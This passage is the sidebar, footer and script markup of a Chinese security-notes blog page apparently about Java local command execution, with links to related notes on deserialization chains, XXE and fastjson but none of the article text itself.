rel="bookmark" title="Java反射">Java反射</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E5%8F%8D%E5%B0%84/" rel="bookmark" title="Java反射">Java反射</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/" rel="bookmark" title="CC1分析">CC1分析</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/URLDNS%E9%93%BE/" rel="bookmark" title="URLDNS链">URLDNS链</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/shiro/" rel="bookmark" title="shiro">shiro</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/" rel="bookmark" title="审计思路">审计思路</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" rel="bookmark" title="10. JaveEE核心">10. JaveEE核心</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="bookmark" title="1. java类加载机制">1. java类加载机制</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" rel="bookmark" title="3. sun.misc.Unsafe">3. sun.misc.Unsafe</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" rel="bookmark" title="4. java文件系统安全">4. java文件系统安全</a></li><li class="active"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="5. java本地命令执行">5. java本地命令执行</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JDBC/" rel="bookmark" title="6. JDBC">6. JDBC</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/%E6%B3%A8%E5%85%A5/" rel="bookmark" title="注入">注入</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/XXE/" rel="bookmark" title="XXE">XXE</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/fastjson/" rel="bookmark" title="fastjson">fastjson</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="余星酒" data-src="/images/avatar.jpg"><p class="name" itemprop="name">余星酒</p><div class="description" itemprop="description">欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">190</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">38</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">30</span> <span class="name">标签</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JDBC/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="分类于 深信服设备">深信服设备</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/AC/" title="分类于 AC">AC</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/AC/%E6%8E%A5%E5%85%A5%E8%AE%A4%E8%AF%81%E5%9F%BA%E7%A1%80/" title="接入认证基础">接入认证基础</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="分类于 网络基础">网络基础</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/%E6%8C%87%E4%BB%A4%E5%90%88%E9%9B%86/" title="指令合集">指令合集</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="分类于 深信服设备">深信服设备</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/AC/%E4%B8%8A%E7%BD%91%E7%AE%A1%E6%8E%A7/" title="上网管控">上网管控</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PDCERF/" title="分类于 应急响应">应急响应</a> <i class="ic i-angle-right"></i> <a href="/categories/PDCERF/%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/" title="分类于 系统加固">系统加固</a></div><span><a href="/PDCERF/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/Linux%E5%8A%A0%E5%9B%BA/" title="Linux加固">Linux加固</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="分类于 网络基础">网络基础</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E9%98%B6%E6%AE%B5%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/" title="实验">实验</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="分类于 编程">编程</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="分类于 Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E5%B8%B8%E7%94%A8%E5%BA%93/" title="分类于 常用库">常用库</a></div><span><a href="/Program/golang/%E5%B8%B8%E7%94%A8%E5%BA%93/time/" title="time">time</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="分类于 代码审计">代码审计</a> <i class="ic i-angle-right"></i> <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" title="分类于 Java安全基础">Java安全基础</a></div><span><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/" title="类动态加载">类动态加载</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/APT/" title="分类于 渗透测试">渗透测试</a> <i class="ic i-angle-right"></i> <a href="/categories/APT/%E9%9D%B6%E5%9C%BA/" title="分类于 靶场">靶场</a></div><span><a href="/APT/%E9%9D%B6%E5%9C%BAwp/%E9%9D%B6%E5%9C%BA/hachthebox/hackthebox%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="hackthebox基础知识">hackthebox基础知识</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="分类于 网络基础">网络基础</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1/" title="网络通信">网络通信</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="分类于 网络基础">网络基础</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/STP/" title="STP">STP</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">余星酒 @ 余星酒</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"APT/代码审计/Java代码审计/审计基础/Java本地命令执行/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->
